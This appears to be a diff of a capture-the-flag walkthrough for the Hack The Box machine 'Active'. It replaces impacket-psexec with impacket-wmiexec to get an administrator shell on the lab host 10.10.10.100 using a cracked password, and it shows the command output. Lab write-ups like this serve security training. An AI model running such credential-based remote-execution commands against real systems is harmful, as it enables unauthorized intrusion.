@@ -28,7 +28,7 @@ Linux:
 - hashcat
 - impacket-GetADUsers
 - impacket-GetUserSPNs
-- impacket-psexec
+- impacket-wmiexec
 - kerbrute
 - ldapsearch
 - netexec
@@ -781,30 +781,23 @@ SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 
 SMB         10.10.10.100    445    DC               [+] active.htb\administrator:Ticketmaster1968 (Pwn3d!)
 ```
 
-`Impacket`’s `psexec.py` can be used to get a shell as `active\administrator`, and read `root.txt`.
+`Impacket`’s `wmiexec.py` can be used to get a shell as `active\administrator`, and read `root.txt`.
 
-`impacket-psexec 'active.htb/administrator:Ticketmaster1968@10.10.10.100'`:
+`impacket-wmiexec 'active.htb/administrator:Ticketmaster1968@10.10.10.100'`:
 ```
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
-[*] Requesting shares on 10.10.10.100.....
-[*] Found writable share ADMIN$
-[*] Uploading file cjtGLGTx.exe
-[*] Opening SVCManager on 10.10.10.100.....
-[*] Creating service ebcY on 10.10.10.100.....
-[*] Starting service ebcY.....
+[*] SMBv2.1 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
 [!] Press help for extra shell commands
-Microsoft Windows [Version 6.1.7601]
-Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
-
-C:\Windows\system32>
+C:\>
 ```
 
-![Victim: system](https://custom-icon-badges.demolab.com/badge/Victim-system-64b5f6?logo=windows11&logoColor=white)
+![Victim: administrator](https://custom-icon-badges.demolab.com/badge/Victim-administrator-64b5f6?logo=windows11&logoColor=white)
 
 `whoami`:
 ```
-nt authority\system
+active\administrator
 ```
 
 `cd C:\\Users\Administrator\Desktop`
